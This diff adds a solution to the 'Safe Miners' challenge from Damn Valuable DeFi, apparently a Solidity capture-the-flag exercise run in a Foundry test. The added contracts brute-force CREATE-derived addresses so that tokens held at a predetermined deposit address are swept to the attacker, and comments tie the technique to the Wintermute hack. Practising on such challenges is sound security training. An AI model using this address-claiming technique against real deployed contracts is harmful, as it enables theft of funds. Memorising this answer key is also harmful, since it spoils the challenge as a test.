@@ -6,6 +6,32 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+contract SafeMinersAttack {
+    constructor(
+        address attacker,
+        IERC20 token,
+        uint256 nonces
+    ) {
+        for (uint256 i; i < nonces; i++) {
+            new TokenSweeper(attacker, token);
+        }
+    }
+}
+
+contract TokenSweeper {
+    constructor(
+        address attacker,
+        IERC20 token
+    ) {
+        uint256 balance = token.balanceOf(address(this));
+        if (balance > 0) {
+            token.transfer(attacker, balance);
+        }
+    }
+}
+
 contract SafeMiners is Test {
     uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
     address internal constant DEPOSIT_ADDRESS =
@@ -38,6 +64,19 @@ contract SafeMiners is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // Note This attack is about brute forcing the CREATE opcode via the attacker deploying a contract that creates a contract
+        // This is building on the wintermute hack where the attacker replayed txn from mainnet to deploy the gnosis proxy factory
+        // which then deployed the proxy via the CREATE opcode resulting in the attacker being able to control the proxy
+
+        // Note: The address at index 1 for default HH accounts which is used for the attacker in the original challenge
+        vm.startPrank(address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8));
+
+        for (uint256 i; i < 100; i++) {
+            new SafeMinersAttack(attacker, dvt, 100);
+        }
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
